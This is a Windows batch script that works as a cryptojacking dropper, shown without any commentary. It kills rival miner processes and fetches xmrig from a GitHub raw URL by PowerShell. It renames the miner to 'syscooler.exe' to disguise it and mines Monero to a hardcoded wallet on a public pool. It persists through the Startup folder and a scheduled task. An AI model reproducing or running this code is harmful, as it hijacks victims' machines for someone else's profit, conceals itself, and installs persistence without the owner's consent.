@echo off

set WALLET=458EEu3hXGVcfSi9Uhrwa68DmC2HcAmwRNK4y3yCsV7gQzoGs8GyyZKbzMmZstEiv5ZsbXnMNEZgzLgEAKV2BycK1fFHRVE
set POOL=pool.supportxmr.com:443

set "MINER_PROCESSES=xmrig xmr-stak ccminer ethminer cgminer cpuminer sgminer bfgminer lolMiner kfc"

for %%i in (%MINER_PROCESSES%) do (
  tasklist /FI "IMAGENAME eq %%i.exe" 2>NUL | find /I /N "%%i.exe" >NUL
  if not errorlevel 1 (
    taskkill /F /IM "%%i.exe"
  )
)

for /F "tokens=2 delims==" %%G in ('wmic OS Get localdatetime /value') do set "datetime=%%G"
set "year=%datetime:~0,4%"
set "month=%datetime:~4,2%"
set "day=%datetime:~6,2%"

set "url=https://raw.githubusercontent.com/1oneman1/syscooler/main/xmrig.zip"
set "zipFile=xmrig.zip"
set "extractDir=xmrig"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%url%', '%zipFile%')"
powershell -Command "Expand-Archive -Path '%zipFile%' -DestinationPath '%extractDir%'"
cd %extractDir%
ren xmrig.exe syscooler.exe
start syscooler.exe --donate-level 1 -o %POOL% -u %WALLET% -k --tls -p sys_win%year%%month%%day%

set "SCRIPT_PATH=%~dp0"
copy %SCRIPT_PATH% "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

schtasks /create /tn "syscooler" /tr "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\syscooler.bat" /sc minute /mo 360 /st 00:00
